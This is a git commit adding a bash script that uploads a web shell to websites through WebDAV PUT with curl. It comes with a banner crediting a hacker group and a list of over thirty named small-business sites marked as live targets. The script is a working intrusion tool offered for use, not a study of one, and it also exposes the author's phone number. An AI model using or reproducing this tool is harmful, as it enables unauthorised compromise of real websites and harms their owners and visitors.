a67186a67359de4ee95fd5b1390a549ecfc9c408
Sruntul-code <56991634+Sruntul-code@users.noreply.github.com>
2019-12-18 13:23:44 +0700

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,57 @@
+#Jangan Di Recode plis
+#Coding Sederhana Kok di recode kan anjing!!!
+#Ini buat belajar oke
+
+figlet Webdav | lolcat
+echo "    Author : Sruntul Code" | lolcat
+echo "    Team   : Java Cyber Army" | lolcat
+echo "    FB     : Suntul Code" | lolcat
+echo "    WA     : 083195027524" | lolcat
+echo "___________________________________________" | lolcat
+echo
+echo "__________________LiveTarget_______________\n" | lolcat
+echo "http://bitsandpieces.co.za" | lolcat
+echo "http://windmillsandporcupines.co.za" | lolcat
+echo "http://scnc.co.za" | lolcat
+echo "http://contsol.co.za" | lolcat
+echo "http://colourfactory.co.za" | lolcat
+echo "http://ayk.co.za" | lolcat
+echo "http://daretogowildafrica.co.za" | lolcat
+echo "http://floralandfresh.co.za" | lolcat
+echo "http://foodconsult.co.za" | lolcat
+echo "http://itsengineering.co.za" | lolcat
+echo "http://hybriddevelopments.co.za" | lolcat
+echo "http://hololiopicbreathwork.co.za" | lolcat
+echo "http://hanover-cs.co.za" | lolcat
+echo "http://handj.co.za" | lolcat
+echo "http://lwrm.co.za" | lolcat
+echo "http://lpenterprises.co.za" | lolcat
+echo "http://kwalitycommodities.co.za" | lolcat
+echo "http://mestern.co.za" | lolcat
+echo "http://megro.co.za" | lolcat
+echo "http://butterflowers.co.za" | lolcat
+echo "http://esfml.com" | lolcat
+echo "http://mc3qs.com" | lolcat
+echo "http://marjoriebresler.com" | lolcat
+echo "http://naturaleyeimages.com" | lolcat
+echo "http://my-resume.biz" | lolcat
+echo "http://mpark.co.za" | lolcat
+echo "http://monliestin.com" | lolcat
+echo "http://africa-one.co.za" | lolcat
+echo "http://ads247.co.za" | lolcat
+echo "http://accelerate-kids.co.za" | lolcat
+echo "http://8x8.co.za" | lolcat
+echo "http://aaglcapetown2013.org.za"| lolcat
+echo "http://allpaint.co.za" | lolcat
+echo "___________________________________________\n" | lolcat
+echo "╭─URL TARGET    " | lolcat
+read url
+echo
+echo "╭─Shell Save on (storage) " | lolcat
+read shell
+echo
+echo "Uploading Shell..." | lolcat
+curl -T /sdcard/$shell $url
+echo "Success...." | lolcat
+echo
+echo $url/$shell
